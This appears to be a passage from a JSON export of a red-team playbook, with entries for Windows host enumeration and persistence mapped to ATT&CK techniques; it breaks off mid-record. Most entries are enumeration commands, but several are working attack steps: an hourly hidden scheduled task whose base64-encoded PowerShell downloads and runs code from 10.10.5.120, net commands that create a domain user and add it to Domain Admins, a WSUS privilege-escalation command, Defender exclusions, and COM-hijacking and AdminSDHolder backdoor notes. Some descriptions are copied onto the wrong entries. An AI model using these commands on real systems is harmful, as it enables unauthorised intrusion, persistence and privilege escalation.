        "content": "# Bookmarks-History\n\n1. Download the history/bookmark files from the following filepaths\n2. Use this tool to read the history: [BrowsingHistoryView 64-bit](https://www.nirsoft.net/utils/browsinghistoryview-x64.zip)\n   \n## Chrome\nLocation of Google Chrome history\n### Windows\n`C:\\Users\\<username>\\AppData\\Local\\Google\\Chrome\\User Data\\Default`\n`C:\\Users\\<username>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache`\n### macOS\n`/Users/<username>/Library/Application Support/Google/Chrome/Default`\n`/Users/<username>/Library/Caches/Google/Chrome/Default/Cache`\n### Linux\n`/home/<username>/.config/google-chrome/Default`\n`/home/<username>/.cache/google-chrome/Default/Cache`\n\n## Firefox\n### Windows\n`C:\\Users\\<username>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<profile folder>`\n`C:\\Users\\<username>\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\<profile folder>\\cache2`\n### macOS\n`/Users/<username>/Library/Application Support/Firefox/Profiles/<profile folder>`\n`/Users/<username>/Library/Caches/Firefox/Profiles/<profile folder>/cache2`\n### Linux\n`/home/<username>/.mozilla/firefox/<profile folder>`\n`/home/<username>/.cache/mozilla/firefox/<profile folder>/cache2`\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Get-BrowserData]]\n```ps\n.PARAMETER Browser\n    The type of browser to enumerate, 'Chrome', 'IE', 'Firefox' or 'All'\n.PARAMETER Datatype\n    Type of data to enumerate, 'History' or 'Bookmarks'\n.PARAMETER UserName\n    Specific username to search browser information for.\n.PARAMETER Search\n    Term to search for\n\nExample:\nEnumerates bookmarks for Internet Explorer for the user 'user1' and only returns results matching the search term 'github'.\n\nGet-BrowserData -Browser All -Datatype History -UserName user1 -Search 'github'\n\n\n```"
        ],
        "tools": [
            "Get-BrowserData"
        ],
        "steps": []
    },
    {
        "id": "971dde7b-5a4c-4b8e-908e-8e619591c959",
        "name": "Common Language Runtime (CLR) Versions",
        "phase": "03. Host Enumeration",
        "ttp": "T1000",
        "external": false,
        "description": "Gather information about internal knowledgebases or target systems by reading the browsers history and bookmarks.",
        "content": "",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[PowerShell]]\n```ps\ndir %WINDIR%\\Microsoft.Net\\Framework\\ /s /b | find \"System.dll\"\n\n[System.IO.File]::Exists(\"$env:windir\\Microsoft.Net\\Framework\\v2.0.50727\\System.dll\")\n\n[System.IO.File]::Exists(\"$env:windir\\Microsoft.Net\\Framework\\v4.0.30319 System.dll\")\n```"
        ],
        "tools": [
            "PowerShell"
        ],
        "steps": []
    },
    {
        "id": "c7bf893c-5d7c-4177-9a5a-5a8828672770",
        "name": "Local User+Groups",
        "phase": "03. Host Enumeration",
        "ttp": "T1069.001",
        "external": false,
        "description": "Identify local groups",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[mmc]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Local users and Groups",
            "\n## [[Net]]\n1. Create User:\n    '''bash\n    net user Patrick patrick12345! /ADD /DOMAIN\n    '''\n2. List local / domain groups\n    '''bash\n    net group /domain\n\n    Gruppenkonten f\u00fcr \\\\dc1.testdomain.local\n    -------------------------------------------------------------------------------\n    *$7O...\n    *Abteilung_....\n    *Dom\u00e4nen-Admins\n    \n    net localgroup [group (Remote Dektop Users)]\n    '''\n1. Add User to domain /local group\n    '''sh\n    net group \"Dom\u00e4nen-Admins\" Patrick /add /domain\n\n    net localgroup \"Remote Desktop Users\" Patrick /add\n    net localgroup \"Administrators\" Patrick /add\n    '''",
            "\n## [[wmic]]\nGet local user accounts\n'''cmd\nwmic useraccount list\n'''"
        ],
        "tools": [
            "mmc",
            "Net",
            "wmic"
        ],
        "steps": []
    },
    {
        "id": "a3d6c2ea-a7cb-49c9-9119-8d27f9017fed",
        "name": "Logged In Users",
        "phase": "03. Host Enumeration",
        "ttp": "T1033",
        "external": false,
        "description": "Identify weaknesses on the local system",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "mmc"
        ],
        "steps": []
    },
    {
        "id": "cf173ad9-6f8b-47a0-8190-ebb7779928dd",
        "name": "Sensitive Files",
        "phase": "03. Host Enumeration",
        "ttp": "T1005",
        "external": false,
        "description": "Identify files containing plain text passwords",
        "content": "# Sensitve Files\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[SessionGopher]]\n```ps\nLocally\n. .\\SessionGopher.ps1\nInvoke-SessionGopher -Thorough\n\nRemote\nhttps://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -Target 10.10.10.10 -u domain.com\\adm-arvanaghi -p s3cr3tP@ss -o\n```",
            "\n## [[wmic]]\nSearch files containing 'password' in the name\n```cmd\nwmic DATAFILE where \"drive='C:' AND Name like '%password%'\" GET Name,readable,size /VALUE\n```"
        ],
        "tools": [
            "PowerView",
            "SessionGopher",
            "wmic"
        ],
        "steps": []
    },
    {
        "id": "7c23ce11-7efc-448c-8c65-11faf0381a92",
        "name": "Web Proxies",
        "phase": "03. Host Enumeration",
        "ttp": "T0000",
        "external": false,
        "description": "Identify web proxies which could block downloads or exfiltrations",
        "content": "# Web Proxies\nReason:\n- Filtering & Monitoring\n- Performance through caching\n- Security (blocking sites and authentication)\n\nIdentify a web proxy via:\n* Groups\n* Seatbelt\n* HTTP header: X-Forwarded-For\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Net]]\n``````beacon\nbeacon> getuid\n[*] You are EDU\\john\n\nbeacon> run net user john /domain\nThe request will be processed at a domain controller for domain edu.evil.corp.\n[...snip...]\n\nGlobal Group memberships     *Domain Users         *Roaming Users        \n                             *Developers           *Proxy Users\n``````",
            "\n## [[Seatbelt]]\nInternet Settings\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe InternetSettings\n\n  HKCU                       ProxyEnable : 1\n  HKCU                     ProxyOverride : ;local\n  HKCU                       ProxyServer : squid.edu.evil.corp:3128\n``````"
        ],
        "tools": [
            "Net",
            "Seatbelt"
        ],
        "steps": []
    },
    {
        "id": "3271fc61-147c-498a-bc97-a33dad5d2862",
        "name": "Event Forwarding",
        "phase": "03. Host Enumeration",
        "ttp": "T1562.002",
        "external": false,
        "description": "Identify events being forwarded",
        "content": "## Tools\n########\n########",
        "category": "Auditing",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt"
        ],
        "steps": []
    },
    {
        "id": "248fe325-396d-4c4e-9243-323f435e5ca9",
        "name": "Remote Users",
        "phase": "03. Host Enumeration",
        "ttp": "T1000",
        "external": false,
        "description": "Identify Users Remotely",
        "content": "",
        "category": "",
        "stealthy": false,
        "changes": [
            ""
        ],
        "tools": [],
        "steps": []
    },
    {
        "id": "248fe325-396d-4c4e-9243-323fb35e5ca9",
        "name": "PowerShell Logging",
        "phase": "03. Host Enumeration",
        "ttp": "T1000",
        "external": false,
        "description": "Identify PowerShell logging",
        "content": "## Receipt\n1. #get_powershell_logging\n\n## Tools\n########\n########",
        "category": "Auditing",
        "stealthy": false,
        "changes": [
            "\n## Script Block Logging\nIf the environment has script block logging enabled, even if we are obfuscating our PowerShell code, before it’s executed by the PowerShell engine, it’s going to be de- obfuscated and logged to the event log in 4104.\n\n## System-wide transcript file\nIf the environment has 'system-wide transcript file' enabled, a share on the network will exist where everything typed in PowerShell (transcript file) will be sent to that network share.\n\n#get_powershell_logging\n```ps\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\n \nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\n```"
        ],
        "tools": [
            "reg",
            "Seatbelt"
        ],
        "steps": []
    },
    {
        "id": "9ab0226d-0d10-4d57-a53a-7419798545d5",
        "name": "Windows Audit Policies",
        "phase": "03. Host Enumeration",
        "ttp": "T1562.002",
        "external": false,
        "description": "Identify Windows Audit Policies",
        "content": "## Tools\n########\n########",
        "category": "Auditing",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt"
        ],
        "steps": []
    },
    {
        "id": "d95f1a12-09f0-49c3-ac95-45a7b6de5e5c",
        "name": "AV-Exclusions",
        "phase": "03. Host Enumeration",
        "ttp": "T1562.001",
        "external": false,
        "description": "NoDescription",
        "content": "# Exlcusions\nPretty much every antivirus solution allows you to define exclusions to on-demand and real-time scanning.  Windows Defender allows admins to add exclusions via GPO, or locally on a single machine.\n\nThe three flavours are:\n\n-   Extension - exclude all files by their file extension.\n-   Path - exclude all files in the given directory.\n-   Process - exclude any file opened by the specified processes.\n\n```beacon\nbeacon> remote-exec winrm dc-2 Get-MpPreference | select Exclusion*\n\nExclusionExtension : \nExclusionIpAddress : \nExclusionPath : {C:\\Shares\\software}\nExclusionProcess :\n```\n\nIf the exclusions are configured via GPO and you can [[Dump GPOs]] the corresponding Registry.pol file, you can read them with [[GPRegistryPolicyParser]].\n\n## Define Defender Exclusions\n```powershell\nSet-MpPreference -ExclusionPath \"<path>\"\n```\n\n## Tools\n########\n########",
        "category": "Misconfigurations",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "29fd5ca7-ad73-4a53-948c-f450757c8612",
        "name": "LLMNR",
        "phase": "03. Host Enumeration",
        "ttp": "T1557.001",
        "external": false,
        "description": "Identify weaknesses on the local system",
        "content": "Returns 0 if disabled.\n`$(Get-ItemProperty -Path \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient\" -name EnableMulticast).EnableMulticast`\n\nIf it returns an error then it is not set.n`Get-ItemProperty -Path \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient\" -name EnableMulticast`## Tools\n########\n########",
        "category": "Misconfigurations",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "4f26577f-fc57-4d99-98ba-d968895d2c23",
        "name": "PowerShell-Version",
        "phase": "03. Host Enumeration",
        "ttp": "T1000",
        "external": false,
        "description": "Gather information about internal knowledgebases or target systems by reading the browsers history and bookmarks.",
        "content": "",
        "category": "Misconfigurations",
        "stealthy": false,
        "changes": [
            "\n## [[reg]]\n```ps\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowershellEngine /v PowershellVersion\n\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowershellEngine /v PowershellVersion\n\nGet-ItemPropertyValue HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\*\\PowerShellEngine\n-Name PowerShellVersion\n```"
        ],
        "tools": [
            "reg"
        ],
        "steps": []
    },
    {
        "id": "b881fd94-ac61-43d6-a3fd-148439b99ebb",
        "name": "WDigest",
        "phase": "03. Host Enumeration",
        "ttp": "T1003",
        "external": false,
        "description": "Identify if WDigest is still enabled, allowing an attacker to steal plaintext credentials",
        "content": "If active, plain-text passwords are stored in LSASS (Local Security Authority Subsystem Service).\n> reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential\n\n\n## Tools\n########\n########",
        "category": "Misconfigurations",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "5a744511-a3d3-4bde-a71c-bfcd5af8f54f",
        "name": "WSUS",
        "phase": "03. Host Enumeration",
        "ttp": "T1546",
        "external": false,
        "description": "Identify if the Windows Update Service is running via the insecure protocol http",
        "content": "1. Gather infos\n>reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer\n2. Needs to be 1\n>HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v UseWUServer\n\n## Tools\n########\n########",
        "category": "Misconfigurations",
        "stealthy": false,
        "changes": [
            "\n## [[Seatbelt]]\n[[Protections/AppLocker]] [[AV-EDR]] [[Credential Guard]] [[Windows Audit Policies]] [[PowerShell Logging]] [[Event Forwarding]] [[Misconfigurations/WSUS]]\n## Get systems environment\n>execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe -group=system -outputfile=\"file.txt\"",
            "\n## [[WSuspicious]]\n[[Misconfigurations/WSUS]]\n1. Add user to Admin and drop file as confirmation:\n    ```bash\n    .\\WSuspicious.exe /command:\" -accepteula -s -d cmd /c \"\"echo eop_executed > C:\\\\eop_poc.txt; net localgroup Administratoren ext_ecorp_user /add\"\"\" /autoinstall\n    ```"
        ],
        "tools": [
            "Seatbelt",
            "WSuspicious"
        ],
        "steps": []
    },
    {
        "id": "b8d9f9e1-c296-4783-8664-072899e37a4b",
        "name": "Scheduled Tasks",
        "phase": "03. Host Enumeration",
        "ttp": "T1053",
        "external": false,
        "description": "Identify scheduled tasks",
        "content": "## Tools\n########\n########",
        "category": "Priv Esc",
        "stealthy": false,
        "changes": [
            "\n## [[mmc]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Task Scheduler\nor `taskschd.msc`",
            "\n## [[SharPersist]]\nCreate a scheduled task with:\n* Powershell x64 bit\n* Name: Updater\n* hourly execute\n``````powershell\n$str = 'IEX ((new-object net.webclient).downloadstring(\"http://10.10.5.120/a\"))'\n\n[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))\n\nexecute-assembly C:\\Tools\\SharPersist\\SharPersist\\bin\\Debug\\SharPersist.exe -t schtask -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==\" -n \"Updater\" -m add -o hourly\n``````"
        ],
        "tools": [
            "mmc",
            "SharPersist"
        ],
        "steps": []
    },
    {
        "id": "48943382-ec1c-42e0-9b24-1c1d460f3879",
        "name": "Services",
        "phase": "03. Host Enumeration",
        "ttp": "T1543.003",
        "external": false,
        "description": "Identify services",
        "content": "## Tools\n########\n########",
        "category": "Priv Esc",
        "stealthy": false,
        "changes": [
            "\n## [[mmc]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Services\nor `services.msc`",
            "\n## [[sc]]\n* Start service  \n`sc [<ServerName>] start <ServiceName>`\n* Stop dervice\n`sc [<ServerName>] stop <ServiceName>` \n* List all services\n`sc queryex type=service state=all`\n* List service names only\n`sc queryex type=service state=all | find /i \"SERVICE_NAME:\"`\n* Search for specific service\n`sc queryex type=service state=all | find /i \"SERVICE_NAME: myService\"`\n* Get security identifier, [read more](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)  \n`sc.exe sdshow [service_short_name]`"
        ],
        "tools": [
            "mmc",
            "sc"
        ],
        "steps": []
    },
    {
        "id": "90eb48f9-0cad-487c-bc75-236088805749",
        "name": "AppLocker",
        "phase": "03. Host Enumeration",
        "ttp": "M1038",
        "external": false,
        "description": "NoDescription",
        "content": "## Identify \n1. Via registry `HKLM\\Software\\Policies\\Microsoft\\Windows\\SrpV2`.\n2. [[Group Policy (GPO)#Identify]]\n    ```gpo\n    KeyName     : Software\\Policies\\Microsoft\\Windows\\SrpV2\\Exe\\921cc481-6e17-4653-8f75-050b80acca20\n    ValueName   : Value\n    ValueType   : REG_SZ\n    ValueLength : 736\n    ValueData   : <FilePathRule Id=\"921cc481-6e17-4653-8f75-050b80acca20\"\n                    Name=\"(Default Rule) All files located in the Program Files folder\"\n                    Description=\"Allows members of the Everyone group to run applications that are located in the Program Files folder.\"\n                    UserOrGroupSid=\"S-1-1-0\"\n                    Action=\"Allow\">\n    <Conditions>\n    <FilePathCondition Path=\"%PROGRAMFILES%\\*\"/>\n    </Conditions>\n    </FilePathRule>\n    ```\n\n\n## Tools\n########\n########",
        "category": "Protections",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt"
        ],
        "steps": []
    },
    {
        "id": "9c7427cc-879e-40e2-a2db-6803d8b6c07c",
        "name": "Attack Surface Reduction Rules (ASR)",
        "phase": "03. Host Enumeration",
        "ttp": "M1040",
        "external": false,
        "description": "NoDescription",
        "content": "# Attack Surface Reduction Rules\n## Checking for ASR\nCan be easily done with [Situational Awareness BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) `reg_query_recursive` in Cobalt Strike:\n* reg_query_recursive HKLM Software\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\n* reg_query_recursive HKLM Software\\Policies\\Microsoft\\Windows Defender\\Policy Manager\n\n\u2139\ufe0f The second query should give you some GUIDs if ASR is enabled, under the registry key ASRRules. The format will be \u2018<GUID1>=1|<GUID2>=0'\u2026 This means that GUID1 is enabled (=1), GUID2 is disabled (=0). If the value is 2 (=2), it means the ASR rule is in audit mode, so not blocking. See the GUID reference table below to see the GUID mapping to ASR rules.\n\n## ASR Rule to GUID Mapping\nYou can use this table as a reference for different GUIDs after you found which ASR rules are enabled on a host system, if it is enabled. Source of this table: [Source](https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/0d921e78b57dbc786587f750db9c0a2e73371a10/Protection%20events/ExploitGuardAsrDescriptions.txt#L13)\n\n| Rule | GUID |\n| ---- | ---- |\n|Block executable content from email client and webmail|be9ba2d9-53ea-4cdc-84e5-9b1eeee46550|\n|Block Office applications from creating child processes|d4f940ab-401b-4efc-aadc-ad5f3c50688a|\n|Block Office applications from creating executable content|3b576869-a4ec-4529-8536-b80a7769e899|\n|Block Office applications from injecting code into other processes|75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84|\n|Block JavaScript or VBScript from launching downloaded executable content|d3e037e1-3eb8-44c8-a917-57927947596d|\n|Block execution of potentially obfuscated scripts|5beb7efe-fd9a-4556-801d-275e5ffc04cc|\n|Block Win32 API calls from Office macro|92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b|\n|Block executable files from running unless they meet a prevalence, age, or trusted list criteria|01443614-cd74-433a-b99e-2ecdc07bfc25|\n|Use advanced protection against ransomware|c1db55ab-c21a-4637-bb3f-a12568109d35|\n|Block credential stealing from the Windows local security authority subsystem (lsass.exe)|9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2|\n|Block process creations originating from PSExec and WMI commands|d1e49aac-8f56-4280-b9ba-993a6d77406c|\n|Block untrusted and unsigned processes that run from USB|b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4|\n|Block Office communication applications from creating child processes (available for beta testing)|26190899-1602-49e8-8b27-eb1d0a1ce869|\n|Block Adobe Reader from creating child processes|7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c|\n|Block persistence through WMI event subscription|e6db77e5-3df2-4cf1-b95a-636979351e5b|\n\n\n## Tools\n########\n########",
        "category": "Protections",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "1e9b67c8-8037-4a10-8d33-f2a49d9d814a",
        "name": "AV-EDR",
        "phase": "03. Host Enumeration",
        "ttp": "M1049",
        "external": false,
        "description": "NoDescription",
        "content": "# AV-EDR\nQuery Processes and identify yourself or let CobaltStrike identify the AV processes via [Process Tree.cna](https://github.com/ars3n11/Aggressor-Scripts/blob/master/ProcessTree.cna)\n\n\n## Tools\n########\n########",
        "category": "Protections",
        "stealthy": false,
        "changes": [
            "\n## [[wmic]]\nList Antivirus\n```cmd\nwmic /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName, productState, pathToSignedProductExe\n```"
        ],
        "tools": [
            "Seatbelt",
            "wmic"
        ],
        "steps": []
    },
    {
        "id": "cb9fc815-8531-4513-848c-c310a22e7caf",
        "name": "Credential Guard",
        "phase": "03. Host Enumeration",
        "ttp": "M1043",
        "external": false,
        "description": "NoDescription",
        "content": "# Credential Guard\n## Identify\nSince Windows10 1703 the process `Lsalso.exe` is running.\n\n`(Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard).SecurityServicesRunning\n`\n* 0: Windows Defender Credential Guard ist deaktiviert (wird nicht ausgef\u00fchrt)\n* 1: Windows Defender Credential Guard ist aktiviert (wird ausgef\u00fchrt)\n\n## Activate\n[MS Docu](https://docs.microsoft.com/de-de/windows/security/identity-protection/credential-guard/credential-guard-manage)\n\n## Deactivate\n[MS Docu](https://docs.microsoft.com/de-de/windows/security/identity-protection/credential-guard/credential-guard-manage#deaktivieren-sie-windows-defender-credential-guard)\n\n\n## Tools\n########\n########",
        "category": "Protections",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Seatbelt"
        ],
        "steps": []
    },
    {
        "id": "0f8b4c0f-e0b6-41a6-9935-8cbfe87ccfb9",
        "name": "Firewall",
        "phase": "03. Host Enumeration",
        "ttp": "M1037",
        "external": false,
        "description": "NoDescription",
        "content": "> Firewall Status \u00dcberpr\u00fcfen > Eine App oder ein Feature ...\n\nThings to check:\n* RDP\n* WinRM\n* PSExec",
        "category": "Protections",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "4b4ae673-f557-44b1-b4da-83d5a4cec299",
        "name": "LSA Protection",
        "phase": "03. Host Enumeration",
        "ttp": "M1025",
        "external": false,
        "description": "Identify weaknesses on the local system",
        "content": "> reg query reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL\n\n## Tools\n########\n########",
        "category": "Protections",
        "stealthy": false,
        "changes": [
            "\n## [[PowerShell]]\n`Get-WinEvent -FilterHashtable @{ LogName='system'; Id='12' ; ProviderName='Microsoft-Windows-Wininit' }`"
        ],
        "tools": [
            "PowerShell"
        ],
        "steps": []
    },
    {
        "id": "b94a13b1-649f-4a4c-87a1-ba2cdb3779b6",
        "name": "User Access Control (UAC)",
        "phase": "03. Host Enumeration",
        "ttp": "M1052",
        "external": false,
        "description": "Identify if UAC is enabled",
        "content": "## Tools\n########\n########",
        "category": "Protections",
        "stealthy": false,
        "changes": [
            "\n## [[Seatbelt]]\nQuery the configuration applied to a machine\n``````beacon\nbeacon> execute-assembly C:\\Tools\\Seatbelt\\Seatbelt\\bin\\Debug\\Seatbelt.exe uac\n\n====== UAC ======\n\nConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries\nEnableLUA (Is UAC enabled?)    : 1\n``````"
        ],
        "tools": [
            "Seatbelt"
        ],
        "steps": []
    },
    {
        "id": "acb8cc72-86b1-472e-ba34-40bea0a505e0",
        "name": "Windows Update",
        "phase": "03. Host Enumeration",
        "ttp": "T1000",
        "external": false,
        "description": "Identify which Windows Updates are installed",
        "content": "",
        "category": "Protections",
        "stealthy": false,
        "changes": [
            "\n## [[wmic]]\nList Updates\n```cmd\nwmic qfe list brief\n```"
        ],
        "tools": [
            "wmic"
        ],
        "steps": []
    },
    {
        "id": "0c4fa102-f140-4e4c-bae0-c6b13b786234",
        "name": "Admin SDHolder Backdoor",
        "phase": "04. Persistence",
        "ttp": "T1098",
        "external": false,
        "description": "NoDescription",
        "content": "# Admin SDHolder Backdoor\nThe **AdminSDHolder** is a DACL template used to protect sensitive principals from modification. Within 60 minutes, you will find modified entries to be restored. Protected objects include Enterprise & Domain Admins, Schema Admins, Backup Operators and krbtgt.\n\nThe AdminSDHolder attribute itself is not protected so if we modify the DACL on it, those changes will be replicated again.\n\n[[PowerView#Assign rights AdminSDHolder]]\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "50c67e44-3137-416c-81d9-42c6eae97c7d",
        "name": "COM Hijacking",
        "phase": "04. Persistence",
        "ttp": "T1546.015",
        "external": false,
        "description": "Buying ages domains in order to bypass trust based connections",
        "content": "# Com Hijacking\n## Theory\nComponent Object Model (COM) is a technology that enables intercommunication between software components of different languages. COM offers a standard interfaces which allows information to flow between them if implemented.\n\nEach COM component is identified via a class ID (CLSID, a unique 128-bit GUID) and each component exposes functionality which can be identified via interface IDs (IIDs). A COM class (coclass) is an implementation of one or more interfaces, represented by their CLSID or a programmatic identifier (ProgID).\n\nIn Windows, COM classes and interfaces are defined in the registry under `HKEY__CLASSES__ROOT\\CLSID` and `HKEY__CLASSES__ROOT\\Interface` respectively. There exists also a RegFree COM which allows a COM component to exist without using the registry. In this case, data such as CLSID is stored in an XML manifest file.\n\n ![](/Images/regedit-com.png)\n\nAn in-process server allows the specified DLL (this DLL is the actual coclass implementation for this CLSID) to be loaded into the process space of the calling application - **InProcServer32** registers a 32bit in-process server.\nDifferent **ThreadingModel**s can be selected:\n* Apartment (Single-Threaded)\n* Free (Multi-Threaded)\n* Both (Single or Multi)\n* Neutral (Thread Neutral).\n\nYou may also find **LocalServer32**, which provides a path to an EXE rather than DLL.\n\n[OleView .NET](https://github.com/tyranid/oleviewdotnet) also allows us to find and inspect COM components.\n\n ![](/Images/oleview-com.png)\n\nCOM hijacking: Modify entries to point to an attacker controlled DLL.\nThe danger: You **will** break functionality.\n\nWhen an application attempts to locate an object, there is a search order that it goes through.\nMachine-wide: `HKEY__LOCAL__MACHINE\\Software\\Classes` \nPer-user: `HKEY__CURRENT__USER\\Software\\Classes`\nThese locations are then merged to form `HKEY__CLASSES__ROOT`.\n\nAny user can hijack or even register new COM objects within HKCU - these only apply to themselves but they do take precedence over those in HKLM.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[PowerShell]]\nList COM objects\n`gwmi Win32_COMSetting | ? {$_.progid } | sort | ft ProgId,Caption,InprocServer32`\n\nList COM Object Methods for WScript.Shell.1\n`$o = [activator]::CreateInstance([type]::GetTypeFromProgID((\"WScript.Shell.1\"))) | gm`",
            "\n## [[Process Monitor]]\nFind COM hijacks\n[Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) shows real-time file system, registry and process activity and is very useful in finding different types of privilege escalation primitives.\n\nDue to the sheer number of events generated, filtering is essential to find the ones of interest. We're looking for:\n\n-   **RegOpenKey** operations.\n-   where the _Result_ is **NAME NOT FOUND**.\n-   and the _Path_ ends with **InprocServer32**.\n ![](/Images/Hunting-com.png)\n\nVerify that the entry does exist in HKLM, but not in HKCU.\n>Get-Item -Path \"HKLM:\\Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32\""
        ],
        "tools": [
            "PowerShell",
            "Process Hacker",
            "Process Monitor"
        ],
        "steps": []
    },
    {
        "id": "4b735b18-7544-4d25-af21-a7aa341177ae",
        "name": "Create Account",
        "phase": "04. Persistence",
        "ttp": "T1136",
        "external": false,
        "description": "Adding a user to the AD for persistence",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[ldapmodify]]\nAdd a new user to the AD via ldap\n1. Create the file called user.ldif.txt\n    ```bash\n    # jdoe, Users, maxcrc.com\n    dn: uid=jdoe,ou=People,dc=maxcrc,dc=com \n    ObjectCIass: posixAccount \n    objectC1ass: top \n    objectC1ass: inetOrgPerson \n    givenName: John \n    sn: Doe \n    uid: jdoe \n    homeDirectory: /home/jdoe \n    cn: jdoe \n    uidNumber: 18735 \n    gidNumber: 500\n    ```\n2. Apply the file and add an element to the LDAP:\n    `.\\ldapmodify.exe -a -x -h 127.0.0.1 -D cn=Manager,dc=maxcrc,dc=com -W -f .\\user.ldif.txt`"
        ],
        "tools": [
            "ldapmodify"
        ],
        "steps": []
    },
    {
        "id": "9033ee38-f8f5-4aa7-9692-33542df7e312",
        "name": "DLL Sideloading",
        "phase": "04. Persistence",
        "ttp": "T1574.002",
        "external": false,
        "description": "Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.",
        "content": "# DLL Sideloading\nSide-loading uses the DLL search order by positioning both the victim application and malicious payload next to each other. Adversaries often use side-loading as a means of hiding their tracks through  legitimate, trusted processes avoiding detection. In order to further evade detection payloads may additionally be encrypted/packed until the in memory execution.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [
            "\n## [[Process Hacker]]\n[[COM Hijacking]]"
        ],
        "tools": [
            "Process Hacker"
        ],
        "steps": []
    },
    {
        "id": "1109bfa4-fc36-41f3-a877-53cbd649b276",
        "name": "Runkey",
        "phase": "04. Persistence",
        "ttp": "T1547.001",
        "external": false,
        "description": "Get Persistence via Teams DLL hijacking",
        "content": "# RunKey\nAutoRun values in HKCU and HKLM allow applications to start on boot. They are often used by software updaters, download or driver utilities.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "d8184aa4-cedf-4667-accc-575e2c468eba",
        "name": "Scheduled Tasks",
        "phase": "04. Persistence",
        "ttp": "T1053",
        "external": false,
        "description": "Get Persistence via Teams DLL hijacking",
        "content": "# Scheduled Task\nThe Windows Task Scheduler allows tje creation of tasks which are associated with a trigger. The different trigger are:\n* time of day\n* user-logon\n* idle state\n* locked state\n* direct execution\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "mmc",
            "SharPersist"
        ],
        "steps": []
    },
    {
        "id": "695c76eb-0b11-4cf8-be62-962324935ba9",
